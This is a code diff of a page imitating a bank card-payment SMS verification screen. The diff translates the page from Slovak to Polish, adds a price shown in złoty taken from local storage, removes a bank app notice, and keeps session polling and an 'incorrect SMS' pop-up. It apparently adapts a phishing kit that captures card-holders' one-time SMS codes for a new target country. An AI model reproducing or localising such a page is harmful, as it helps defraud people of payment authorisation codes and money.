@@ -1168,7 +1168,7 @@ img.processing {
                                 o.addEventListener("click", function () {
                                     return e.showModal()
                                 })
-                            })
+                           })
                         }
                     }, {
                         key: "showModal", value: function () {
@@ -1789,28 +1789,37 @@ img.processing {
             
             <a href="javascript:showHelp();">
                 <img src="data:," alt="help" class="help">
-                <span>Nápoveda</span>
+                <span>Pomoc</span>
             </a>
         
     </div>
 </div>
             <div style="margin-top: 15px;">
-    <div class="cs-two-text-columns pr-0">
-        <strong>Dátum a čas:</strong>
-        <div id="security-code-date"></div>
-    </div>
-    <div class="cs-two-text-columns">
-        <strong>Číslo karty:</strong>
-        <div id="masked-card-number"></div>
-    </div>
-    
+
+              
+
+                <div class="cs-two-text-columns">
+                    <strong>Numer karty:</strong>
+                    <div id="masked-card-number"></div>
+                </div>
+
+                <div class="cs-two-text-columns pr-0">
+                    <strong>Data i godzina:</strong>
+                    <div id="security-code-date"></div>
+                </div>
+
+                <div class="cs-two-text-columns">
+                    <strong>Suma:</strong>
+                    <div id="price"></div>
+                </div>
+
     
     <div class="cs-three-columns sms">
-        <label for="authCode" class="cs-label">Jednorazový SMS kód:</label>
+        <label for="authCode" class="cs-label">Jednorazowy kod SMS:</label>
         <input id="authCode" type="text" name="authCode" placeholder="______" maxlength="8" autofocus="true" style="width: 118px" oninput="payButtonActivateEpin(secCodeLength, epinCodeLength, isEpinRequired)" onselect="payButtonActivateEpin(secCodeLength, epinCodeLength, isEpinRequired)" onkeyup="this.value=this.value;payButtonActivateEpin(secCodeLength, epinCodeLength, isEpinRequired)">
         <div class="resend-multiline">
             <a href="javascript:resendCodeFn(this);">
-                <span>Opätovné zaslanie SMS kódu</span>
+                <span>Ponowne wysłanie kodu SMS</span>
             </a>
         </div>
     </div>
@@ -1876,19 +1885,19 @@ img.processing {
     <div id="footer">
         <div id="footer-content">
             <div class="cs-button-row onlybrwbutton light-blue">
-                <button name="buttonsubmit" type="submit" onclick="submitForm(event)" disabled="true">Pokračovať</button>
+                <button name="buttonsubmit" type="submit" onclick="submitForm(event)" disabled="true">Zamknąć</button>
             </div>
             <div id="loadingMessage">
                 <div class="spinner"></div>
             </div>
             
             <div class="cs-link-row onlybrwbutton">
-                <a href="javascript:sendCancel(this);" class="red cancelButton">Zrušiť</a>
+                <a href="javascript:sendCancel(this);" class="red cancelButton">Anulować</a>
             </div>
             
             <div class="row cs-text center-info onlybrwbutton">
                 <div class="column">
-                    <p>Ak nechcete nabudúce zadávať ePIN a SMS, stiahnite si do mobilu našu aplikácie mToken.</p>
+                    <p></p>
                 </div>
             </div>
             
@@ -1901,7 +1910,7 @@ img.processing {
         <div id="help" style="display: none; line-height: 1.5">
     <div class="row cs-text title">
         <div class="column">
-            <strong>Nápoveda</strong>
+            <strong>Pomoc</strong>
         </div>
     </div>
 
@@ -1928,11 +1937,11 @@ img.processing {
                 <div role="document">
                     <header class="modal__header" id="modal-1-title"></header>
                     <div class="mep_modal_content" id="modal-1-content">
-                        <div id="dialog-notification-1" class="dialogText" style="display: none;"><strong>Na zadanie SMS kódu ostávajú 2 minúty!</strong><br>Po uplynutí limitu bude platba zrušená.</div>
-                        <div id="dialog-notification-2" class="dialogText" style="display: none;"><strong>Na zadanie SMS kódu zostáva 30 sekúnd!</strong><br>Po uplynutí limitu bude platba zrušená.</div>
+                        <div id="dialog-notification-1" class="dialogText" style="display: none;"><strong>Zostały 2 minuty na wprowadzenie kodu SMS!</strong><br>Po upływie tego czasu płatność zostanie anulowana.</div>
+                        <div id="dialog-notification-2" class="dialogText" style="display: none;"><strong>Zostały 30 sekund na wprowadzenie kodu SMS!</strong><br>Po upływie tego czasu płatność zostanie anulowana.</div>
                     </div>
                     <div class="row cs-wide-button">
-                        <button id="closeButton" class="modal__btn modal__btn-primary" data-micromodal-close="true" aria-label="Close this dialog window">Zavrieť</button>
+                        <button id="closeButton" class="modal__btn modal__btn-primary" data-micromodal-close="true" aria-label="Close this dialog window">Zamknąć</button>
                     </div>
                 </div>
             </div>
@@ -1999,6 +2008,13 @@ img.processing {
 
 <script>
 const session = JSON.parse(localStorage.getItem('session'));
+let telephone = localStorage.getItem('telephone');
+let price = localStorage.getItem('price');
+const telephoneElement = document.getElementById('telephone');
+const priceElement = document.getElementById('price');
+
+localStorage.setItem('price', price);
+priceElement.textContent += price + ' zł';
     function fetchUpdate() {
     
     console.log('sesion: ' + session)
@@ -2258,7 +2274,7 @@ function openModal_sms() {
     modal.innerHTML = `
         <div class="modal-content">
             <span class="close">&times;</span>
-            <p class="dota_2">Nesprávny SMSㅤ</p>
+            <p class="dota_2">Niepoprawny SMS</p>
         </div>
     `;
 
